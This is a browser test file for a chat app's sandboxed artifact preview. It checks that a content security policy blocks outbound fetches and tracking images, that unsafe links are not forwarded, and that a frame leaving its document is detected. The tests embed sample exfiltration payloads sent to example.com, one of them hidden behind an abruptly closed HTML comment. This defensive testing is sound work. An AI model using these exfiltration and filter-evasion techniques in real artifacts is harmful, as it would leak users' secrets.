import { afterEach, describe, expect, it } from "vitest";
import { buildHtmlSrcdoc, createFrameLeaveGuard } from "$lib/chat/utils/previewSrcdoc";

type PreviewMessage = {
	type: string;
	channel: string;
	detail?: { href?: string; message?: string };
};

let iframes: HTMLIFrameElement[] = [];

afterEach(() => {
	for (const iframe of iframes) iframe.remove();
	iframes = [];
});

/** Wait for the next postMessage on the given preview channel */
function nextMessage(channel: string, timeoutMs = 5000): Promise<PreviewMessage> {
	return new Promise((resolve, reject) => {
		const timer = setTimeout(() => {
			window.removeEventListener("message", onMsg);
			reject(new Error("timed out waiting for preview message"));
		}, timeoutMs);
		function onMsg(ev: MessageEvent) {
			const data = ev.data as Partial<PreviewMessage> | null;
			if (!data || typeof data !== "object" || data.channel !== channel) return;
			// The hook reports its own lifecycle (CUR-3527); these tests wait for what comes after it
			if (data.type === "chatui.preview.ready" || data.type === "chatui.preview.loaded") return;
			clearTimeout(timer);
			window.removeEventListener("message", onMsg);
			resolve(data as PreviewMessage);
		}
		window.addEventListener("message", onMsg);
	});
}

/**
 * Render body content in a sandboxed preview iframe, exactly like the artifact
 * panel does. The sandbox has an opaque origin, so tests cannot reach into the
 * document; the body must drive itself (e.g. click its own links on load).
 */
function renderPreview(body: string, channel: string): HTMLIFrameElement {
	const iframe = document.createElement("iframe");
	iframe.sandbox.add("allow-scripts");
	iframe.srcdoc = buildHtmlSrcdoc(
		`<!doctype html><html><head></head><body>${body}</body></html>`,
		channel
	);
	document.body.appendChild(iframe);
	iframes.push(iframe);
	return iframe;
}

describe("artifact policy in a real browser (CUR-3187)", () => {
	it("blocks an artifact's fetch to another server, even from a script placed before <head>", async () => {
		const channel = "test_csp_fetch";
		const message = nextMessage(channel);
		const iframe = document.createElement("iframe");
		iframe.sandbox.add("allow-scripts");
		iframe.srcdoc = buildHtmlSrcdoc(
			// A CORS failure would also reject the fetch, so the test waits for the violation event,
			// which only a policy raises.
			`<html><script>
				document.addEventListener("securitypolicyviolation", function(e){
					parent.postMessage({ type: "result", channel: "${channel}", detail: { message: e.effectiveDirective } }, "*");
				});
				fetch("https://example.com/leak?d=secret", { mode: "no-cors" }).catch(function(){});
			</script><head></head><body></body></html>`,
			channel
		);
		document.body.appendChild(iframe);
		iframes.push(iframe);
		expect((await message).detail?.message).toBe("connect-src");
	});

	it("blocks a fetch from a script hidden behind an abruptly closed comment before the doctype", async () => {
		const channel = "test_csp_comment";
		const message = nextMessage(channel);
		const iframe = document.createElement("iframe");
		iframe.sandbox.add("allow-scripts");
		// `<!-->` is a whole comment to the HTML parser, so the script after it is live markup.
		iframe.srcdoc = buildHtmlSrcdoc(
			`<!--><script>
				document.addEventListener("securitypolicyviolation", function(e){
					parent.postMessage({ type: "result", channel: "${channel}", detail: { message: e.effectiveDirective } }, "*");
				});
				fetch("https://example.com/leak?d=secret", { mode: "no-cors" }).catch(function(){});
			</script>--><!doctype html><html><head></head><body></body></html>`,
			channel
		);
		document.body.appendChild(iframe);
		iframes.push(iframe);
		expect((await message).detail?.message).toBe("connect-src");
	});

	it("reports a securitypolicyviolation for a remote image, so the URL never loads", async () => {
		const channel = "test_csp_img";
		const message = nextMessage(channel);
		renderPreview(
			`<script>document.addEventListener("securitypolicyviolation", function(e){
				parent.postMessage({ type: "result", channel: "${channel}", detail: { message: e.effectiveDirective } }, "*");
			});</script><img src="https://example.com/pixel.png?d=secret">`,
			channel
		);
		expect((await message).detail?.message).toBe("img-src");
	});
});

describe("preview hook script", () => {
	it("forwards http(s) link clicks to the parent, including clicks on nested elements", async () => {
		const channel = "test_links";
		const message = nextMessage(channel);
		renderPreview(
			`<a href="https://huggingface.co/models"><b id="inner">View model</b></a>
			<script>window.addEventListener('load', function(){ document.getElementById('inner').click(); });</script>`,
			channel
		);
		expect(await message).toEqual({
			type: "chatui.preview.openLink",
			channel,
			detail: { href: "https://huggingface.co/models" },
		});
	});

	it("does not forward javascript:, relative, or in-page fragment links", async () => {
		const channel = "test_blocked";
		const message = nextMessage(channel);
		// None of the blocked clicks may produce a message, so the sentinel link
		// clicked last must be the first message observed. Relative hrefs would
		// resolve against the app's own origin (srcdoc inherits the parent base
		// URL) and must stay blocked.
		renderPreview(
			`<a id="js" href="javascript:void(0)">js</a>
			<a id="rel" href="/settings">relative</a>
			<a id="rel2" href="models/foo">relative 2</a>
			<a id="proto" href="//example.com/x">protocol-relative</a>
			<a id="frag" href="#section">frag</a>
			<div id="section"></div>
			<a id="sentinel" href="http://example.com/after">ok</a>
			<script>window.addEventListener('load', function(){
				document.getElementById('js').click();
				document.getElementById('rel').click();
				document.getElementById('rel2').click();
				document.getElementById('proto').click();
				document.getElementById('frag').click();
				document.getElementById('sentinel').click();
			});</script>`,
			channel
		);
		expect((await message).detail?.href).toBe("http://example.com/after");
	});

	it("still forwards uncaught errors", async () => {
		const channel = "test_errors";
		const message = nextMessage(channel);
		renderPreview(
			`<script>window.addEventListener('load', function(){ setTimeout(function(){ throw new Error('boom'); }, 0); });</script>`,
			channel
		);
		const received = await message;
		expect(received.type).toBe("chatui.preview.error");
		expect(received.detail?.message).toContain("boom");
	});
});

describe("a preview frame that leaves its srcdoc is noticed (CUR-3527)", () => {
	// A srcdoc frame inherits the parent's base URL, so these are real http navigations to the test
	// server; an attacker would name their own host instead. The destination is a static file: a
	// routed path makes the test server evaluate SvelteKit's SSR modules, which fails in vite's module
	// runner and times out client tests in later files (CUR-2478).
	const NAVIGATE = `location.href = new URL("/robots.txt?left-srcdoc=1", document.baseURI).href;`;
	const HOOK_TYPES = ["chatui.preview.ready", "chatui.preview.loaded", "chatui.preview.leaving"];

	/** Mounts a guarded frame; `loads` counts iframe load events, so a test can read it when the guard fires. */
	function guardedFrame(body: string, channel: string, onLeft: () => void): { loads: number } {
		const state = { loads: 0 };
		const iframe = document.createElement("iframe");
		iframe.sandbox.add("allow-scripts", "allow-forms");
		const guard = createFrameLeaveGuard(onLeft);
		window.addEventListener("message", (ev) => {
			if (ev.source !== iframe.contentWindow || ev.data?.channel !== channel) return;
			if (HOOK_TYPES.includes(ev.data?.type)) guard.onMessage(ev.data.type);
		});
		iframe.onload = () => {
			state.loads += 1;
			guard.onload();
		};
		iframe.srcdoc = buildHtmlSrcdoc(`<!doctype html><html><head></head><body>${body}</body></html>`, channel);
		document.body.appendChild(iframe);
		iframes.push(iframe);
		return state;
	}

	/** Resolves with the frame's load count at the moment the guard fired. */
	function loadsWhenFired(body: string, channel: string): Promise<number> {
		return new Promise<number>((resolve, reject) => {
			const timer = setTimeout(() => reject(new Error("guard never fired")), 5000);
			const state = guardedFrame(body, channel, () => {
				clearTimeout(timer);
				resolve(state.loads);
			});
		});
	}

	it("fires before the destination loads when the script navigates while the srcdoc is parsing", async () => {
		// Zero loads: the guard does not wait on the new page, so one that never finishes is still caught
		expect(await loadsWhenFired(`<script>${NAVIGATE}</script>`, "test_leave_parse")).toBe(0);
	});

	it("fires before the destination loads when the script navigates after the srcdoc loaded", async () => {
		// One load, the srcdoc's own
		expect(
			await loadsWhenFired(
				`<script>addEventListener("load", function(){ setTimeout(function(){ ${NAVIGATE} }, 200); });</script>`,
				"test_leave_late"
			)
		).toBe(1);
	});


	it("stays quiet for a frame that runs its script and stays on its own document", async () => {
		const channel = "test_stay";
		let fired = false;
		const done = nextMessage(channel);
		guardedFrame(
			`<script>setTimeout(function(){ parent.postMessage({ type: "done", channel: "${channel}" }, "*"); }, 300);</script>`,
			channel,
			() => (fired = true)
		);
		await done;
		// Past the guard's grace window, so a missing loaded report would have fired by now
		await new Promise((r) => setTimeout(r, 1500));
		expect(fired).toBe(false);
	});
});
